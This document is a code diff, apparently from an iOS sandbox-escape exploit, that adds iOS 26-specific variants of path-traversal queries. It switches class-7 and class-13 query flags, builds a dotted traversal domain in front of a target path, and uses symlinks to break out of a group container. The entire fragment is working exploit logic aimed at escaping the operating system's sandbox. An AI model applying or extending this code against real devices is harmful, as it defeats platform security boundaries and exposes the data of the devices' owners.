@@ -605,8 +605,16 @@ static int64_t bq_escape_symlink(NSString *target, NSString **linkOut) {
             continue;
         }
         NSString *path = nil;
-        int64_t h = bq_query_escape(7, gid, YES, 3, @"", 0x8100000000ULL,
+        // The iOS 26 variant of worse_query uses a different class-7 flag.
+        // Whether the same query succeeds on a particular watch is runtime-dependent.
+        uint64_t flags = NSProcessInfo.processInfo.operatingSystemVersion.majorVersion == 26
+            ? 0x0800000000ULL : 0x8100000000ULL;
+        int64_t h = bq_query_escape(7, gid, YES, 3, @"", flags,
                                     [@"class7-symlink/" stringByAppendingString:gid], &path);
+        if (h < 0 && flags != 0x8100000000ULL) {
+            h = bq_query_escape(7, gid, YES, 3, @"", 0x8100000000ULL,
+                                [@"class7-symlink-default/" stringByAppendingString:gid], &path);
+        }
         if (h >= 0) {
             gEscapeGroupRoot = groot;
             if (linkOut) *linkOut = caches;
@@ -635,6 +643,18 @@ int64_t BQEscape(NSString *target, NSString **linkOut) {
             if (linkOut) *linkOut = p ?: target;
             BQLog(@"escape: using class13 traversal -> %@", p ?: target);
             return h;
+        }
+        if (NSProcessInfo.processInfo.operatingSystemVersion.majorVersion == 26) {
+            // Match bad_query's original system-group traversal and flag.
+            NSString *badDomain = [bq_dots(8) stringByAppendingString:target];
+            h = bq_query_escape(13, kMGGroup, YES, 3, badDomain, 0x8000000000ULL,
+                                @"class13-bad-query", &p);
+            if (h >= 0) {
+                gTraversalState = 1;
+                if (linkOut) *linkOut = p ?: target;
+                BQLog(@"escape: using bad_query traversal -> %@", p ?: target);
+                return h;
+            }
         }
         gTraversalState = -1;
         last = h;
